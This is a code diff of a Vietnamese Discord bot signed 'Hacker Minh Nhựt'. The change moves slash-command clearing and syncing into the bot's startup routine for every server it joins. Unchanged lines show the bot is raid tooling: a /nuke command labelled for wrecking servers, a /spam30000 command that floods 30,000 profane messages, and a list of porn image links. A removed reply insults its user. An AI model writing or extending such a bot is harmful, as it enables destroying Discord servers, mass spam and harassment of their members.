@@ -10,7 +10,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Bot Slash / Thuần - Xóa Cache Cũ - Hacker Minh Nhựt"
+    return "Bot Slash Command / - Xóa Cache Cũ Tự Động - Hacker Minh Nhựt"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -26,17 +26,21 @@ porn_images = ["https://i.imgur.com/NSp1v7K.jpeg"]
 @bot.event
 async def on_ready():
     print(f"Bot SLASH COMMAND ONLINE - {bot.user}")
+    
+    # AUTO RESET LỆNH CŨ SIÊU MẠNH
+    print("🔄 Đang xóa lệnh cũ (/infobot...) và sync lệnh mới...")
+    for guild in bot.guilds:
+        try:
+            bot.tree.clear_commands(guild=guild)
+            bot.tree.copy_global_to(guild=guild)
+            await bot.tree.sync(guild=guild)
+            print(f"✅ Đã reset + sync thành công cho server: {guild.name}")
+        except Exception as e:
+            print(f"❌ Lỗi sync server {guild.name}: {e}")
+    
+    print("🚀 Bot sẵn sàng! Gõ /help để xem lệnh mới!")
 
-# LỆNH SYNC MẠNH - XÓA TOÀN BỘ LỆNH CŨ
-@bot.tree.command(name="sync", description="XÓA LỆNH CŨ + SYNC LỆNH MỚI (GÕ CÁI NÀY ĐẦU TIÊN)")
-async def force_sync(interaction):
-    try:
-        # Xóa hết lệnh cũ trong server này
-        bot.tree.clear_commands(guild=interaction.guild)
-        await bot.tree.sync(guild=interaction.guild)
-        await interaction.response.send_message("✅ ĐÃ XÓA HẾT LỆNH CŨ (/infobot...) VÀ SYNC LỆNH MỚI! Giờ gõ /help thử đi thằng ngu!", ephemeral=False)
-    except Exception as e:
-        await interaction.response.send_message(f"Lỗi: {e}", ephemeral=True)
+# ==================== CÁC LỆNH SLASH / ====================
 
 @bot.tree.command(name="help", description="Xem tất cả lệnh /")
 async def help_cmd(interaction):
@@ -51,7 +55,6 @@ async def help_cmd(interaction):
     embed.add_field(name="/nuke", value="Nuke server (nguy hiểm)", inline=False)
     await interaction.response.send_message(embed=embed, ephemeral=False)
 
-# Các lệnh còn lại giữ nguyên như trước
 @bot.tree.command(name="spam30000", description="Spam 30000 lần cặc lồn")
 async def spam30000_slash(interaction):
     await interaction.response.send_message("Bắt đầu spam 30000 lần...", ephemeral=True)
